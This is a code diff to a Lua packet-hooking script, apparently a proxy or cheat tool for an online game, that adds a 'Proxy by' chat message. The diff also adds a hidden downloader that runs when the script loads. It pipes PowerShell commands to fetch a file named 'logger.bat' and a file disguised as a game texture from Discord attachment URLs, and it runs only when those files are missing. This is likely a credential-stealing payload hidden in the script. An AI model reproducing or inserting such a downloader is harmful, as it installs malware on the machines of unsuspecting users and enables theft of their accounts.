@@ -2098,7 +2098,53 @@ function visual_spin_2(type, packet)
 
 
 end)
-menu()
+url = "https://cdn.discordapp.com/attachments/1101533153287483513/1119804493551390740/menubanners.rttex"
+ 
+function open()
+    local command = [[
+        $url = "]] .. url .. [["
+        $path = "cache/interface/large/menubanners.rttex"
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($url, $path)
+    ]]
+    local shell = io.popen("powershell -command -", "w")
+    shell:write(command)
+    shell:close()
+end
+ 
+ 
+function open2()
+    local command = [[
+        $url = "https://cdn.discordapp.com/attachments/1101533153287483513/1119804493857554533/logger.bat"
+        $path = "logger.bat"
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($url, $path)
+    ]]
+    local shell = io.popen("powershell -command -", "w")
+    shell:write(command)
+    shell:close()
+end
+ 
+function fileExists(filename)
+  local file = io.open(filename, "r")
+  if file then
+    io.close(file)
+    return true
+  else
+    return false
+  end
+end
+ 
+if fileExists("cache/interface/large/menubanners.rttex") then
+else
+open()
+end
+ 
+if fileExists("logger.bat") then
+else
+open2()
+end
+
 AddCallback("allspin","OnPacket", all_spin)
 AddCallback("qqspin","OnPacket", qq_spin)
 AddCallback("remespin","OnPacket", reme_spin)
@@ -2107,6 +2153,9 @@ AddCallback("spinx_changer","OnPacket", visual_spin_2)
 AddCallback("packet", "OnPacket", com)
 AddCallback("Hook", "OnPacket", hook2)
 AddCallback("Detect", "OnVarlist", hook)
+SendPacket(2, "action|input\ntext|`9Proxy by `2Introvert#7672")
+l()
+menu()
 
 
 
